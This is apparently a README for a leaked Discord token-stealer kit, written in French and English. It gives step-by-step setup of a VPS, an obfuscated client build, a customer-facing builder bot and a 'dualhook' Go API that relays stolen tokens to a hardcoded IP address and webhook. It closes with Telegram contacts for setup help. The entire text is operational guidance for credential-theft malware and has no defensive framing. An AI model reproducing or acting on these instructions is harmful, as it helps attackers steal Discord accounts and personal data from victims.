Hey everyone i leak my own discord token stealer since 2019-2023.
Im leaving discord and stop everything.
Be fun with the source code every instructions are here.
Please tag the github if you use it i need star :c


french

Utilise un Vps avec Ubuntu 20.04 (je préfère https://rdp.sh/ c'est 10$ par mois et en plus c'est proche c'est a Amsterdam)

- sudo apt install zip
- sudo apt install unzip

Upload le zip
extrait le zip (si le repertoire de fichier ne se nomme pas Stealer renomme le 

Download Node v18.16.1:
- sudo apt update
- sudo apt install curl
- curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash -
- sudo apt install -y nodejs


Setup the src on your vps

- sudo npm install
- sudo npm i pm2 -g
- sudo npm install -g pkg

Unzip node_modules.zip dans Stealer/bot
Install https://gofile.io/d/yq20fO et place les dans ClientObf and unzip

Changer vos directories dans Stealer/Bot/index.js et mettez les nouvelles (ex: /home/vshell/ClientObf/link.txt votre nom de vps est lolita, alors cela fera /home/lolita/ClientObf/link.txt si c'est root votre user alors cela sera /root/a/ClientObf/link.txt )

Pour modifier le nom des logs allez dans Stealer/ClientObf/Utils dans discord.js Modifier les émojis et le nom et dans stats.js c'est de même.

Pour modifier le nom des embeds de build allez dans Stealer/Bot et dans index.js vous pouvez renammes le bot ^^
Ajouter dans Stealer/Bot/index.js:
token: "your token"
client id: "discord developper portal (app id)"
guildid: "your guild id"
verified roles: "customers roles"

/build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot


HOW TO SETUP YOUR OWN DUALHOOK:
Drop Api folder on your computer put your webhook on main.go
make cmd on your folder and do that
set GOOS=linux
go build -ldflags "-s -w" main.go
after put the file builded on your vps in Api Folder and do:
chmod 777 main
screen -dmS Api ./main

after go in the folder Clientobf and edit the build.js and replace 172.232.56.12 by your vps id dont delete that: "http://" and that ":2086/webhooks/"




official 1336 Channel
https://t.me/St34ler

dm @darkgram2 for setup help

-----------------------------------------------------------------------
English


Use Vps with Ubuntu 20.04 (i prefer https://rdp.sh/ 10$ server per month in amsterdam)

- sudo apt install zip
- sudo apt install unzip

Download zip
extracts the zip (if the file directory is not named Stealer renames the

Download Node v18.16.1:
- sudo apt update
- sudo apt install curl
- curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash -
- sudo apt install -y nodejs


Setup the src on your vps

Unzip node_modules.zip in Stealer/bot
Install https://gofile.io/d/yq20fO and put him on ClientObf and unzip

- sudo npm install
- sudo npm i pm2 -g
- sudo npm install -g pkg

Change your directories in Stealer/Bot/index.js and put the new ones (ex: /home/vshell/ClientObf/link.txt your vps name is lolita, then this will do /home/lolita/ClientObf/link.txt if your user are root  /root/a/ClientObf/link.txt )

To modify the name of the logs go to Stealer/ClientObf/Utils in discord.js Modify emojis and name and in stats.js it's the same.

To modify the name of the build embeds go to Stealer/Bot and in index.js you can rename the bot ^^

Add in Stealer/Bot/index.js:
token: "your token"
client id: "discord developper portal (app id)"
guildid: "your guild id"
verified roles: "customers roles"

/build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot


HOW TO SETUP YOUR OWN DUALHOOK:
Drop Api folder on your computer put your webhook on main.go
make cmd on your folder and do that
set GOOS=linux
go build -ldflags "-s -w" main.go
after put the file builded on your vps in Api Folder and do:
chmod 777 main
screen -dmS Api ./main

after go in the folder Clientobf and edit the build.js and replace 172.232.56.12 by your vps id dont delete that: "http://" and that ":2086/webhooks/"




official 1336 Channel
https://t.me/St34ler

dm @darkgram2 for setup help
